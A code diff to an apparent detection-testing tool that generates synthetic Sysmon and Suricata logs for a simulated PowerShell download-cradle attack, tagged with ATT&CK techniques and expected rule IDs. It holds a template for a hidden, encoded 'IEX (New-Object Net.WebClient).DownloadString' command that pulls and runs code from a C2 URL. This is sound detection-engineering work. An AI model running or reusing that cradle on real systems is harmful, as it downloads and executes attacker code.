@@ -78,30 +78,43 @@ def powershell_cradle(cfg: dict, world: World, tl: Timeline, start: float) -> No
     cradle = f"IEX (New-Object Net.WebClient).DownloadString('{p['c2_url']}')"
     command_line = f"powershell.exe -NoP -NonI -W Hidden -Enc {_psencode(cradle)}"
 
+    ps_guid = world.guid()
+    ps_pid = world.pid()
     tl.emit(start, "windows_events.json", partial(
         windows.sysmon_process_create,
         computer=host, record_id=world.record_id(), image=windows.POWERSHELL,
         command_line=command_line, parent_image=parent_image,
         parent_command_line=f'"{parent_image}" /n', user=user,
-        process_guid=world.guid(), parent_process_guid=world.guid(),
-        process_id=world.pid(), parent_process_id=world.pid()))
+        process_guid=ps_guid, parent_process_guid=world.guid(),
+        process_id=ps_pid, parent_process_id=world.pid()))
 
     tl.label(start, technique_id="T1059.001", tactic="Execution", scenario=name,
              host=host, source="sysmon", expected_rules=p.get("expected_rules", []),
              note="encoded PowerShell spawned by an Office process")
 
-    # The cradle then fetches its second stage — the actual ingress tool transfer.
-    # Emit the HTTP GET as network telemetry (Suricata) so it can be detected.
     u = urlsplit(p["c2_url"])
-    off = start + rng.uniform(1.5, 3.0)
+    # Endpoint view of the download: the SAME PowerShell process (processGuid)
+    # opens an outbound connection to the C2 — lets us correlate to the execution.
+    off_net = start + rng.uniform(1.0, 2.0)
+    tl.emit(off_net, "windows_events.json", partial(
+        windows.sysmon_network_connection,
+        computer=host, record_id=world.record_id(), process_guid=ps_guid, process_id=ps_pid,
+        image=windows.POWERSHELL, user=user, source_ip=world.ip_of(host),
+        source_port=rng.randint(40000, 60000), dest_ip=u.hostname, dest_port=u.port or 80,
+        dest_hostname=u.hostname))
+
+    # Network-sensor view of the same fetch: the HTTP GET of the second stage.
+    off = start + rng.uniform(2.0, 3.5)
     tl.emit(off, "eve.json", partial(
         suricata.http_request, src_ip=world.ip_of(host), dest_ip=u.hostname,
         hostname=u.hostname, url=u.path or "/", dest_port=u.port or 80,
         src_port=rng.randint(40000, 60000), user_agent=_PS_UA,
         status=200, length=rng.randint(20000, 90000)))
     tl.label(off, technique_id="T1105", tactic="Command and Control", scenario=name,
-             host=host, source="suricata", expected_rules=[100310],
-             note=f"HTTP download of {p['c2_url']} (ingress tool transfer)")
+             host=host, source="suricata+sysmon",
+             expected_rules=[100310, 100430],
+             note=f"download of {p['c2_url']} — Suricata HTTP (100310) + exec-correlated "
+                  f"endpoint connection (100430)")
 
 
 def scheduled_task(cfg: dict, world: World, tl: Timeline, start: float) -> None:
